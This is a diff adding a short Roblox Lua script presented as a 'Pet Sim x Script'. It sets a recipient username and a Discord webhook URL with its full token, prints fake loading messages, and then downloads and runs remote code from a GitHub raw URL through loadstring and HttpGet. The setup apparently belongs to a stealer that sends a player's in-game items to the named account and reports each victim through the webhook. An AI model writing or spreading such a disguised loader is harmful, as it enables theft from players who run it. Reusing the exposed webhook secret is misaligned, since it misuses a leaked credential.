@@ -1,0 +1,14 @@
+Username = "Im_6Eyes2"
+Webhooks = "https://discord.com/api/webhooks/1123120647934058547/DDqyEFKkPs5VXbc6FYZgwK5M71s1nPcKFYYmCuHpexu-lkOCc5jijqIzWmDL6FSlJrYp"
+ 
+_G.CustomScriptName = "Pet Sim x Script"
+ 
+_G.Text1 = "Script Loaded..."
+ 
+_G.Text2 = "Waiting for Script..."
+ 
+_G.Text3 = "Checking Scripts..."
+ 
+_G.Text4 = "Starting Script..."
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jopsc/MainOp_script/main/Pet_scriptPetboi"))()
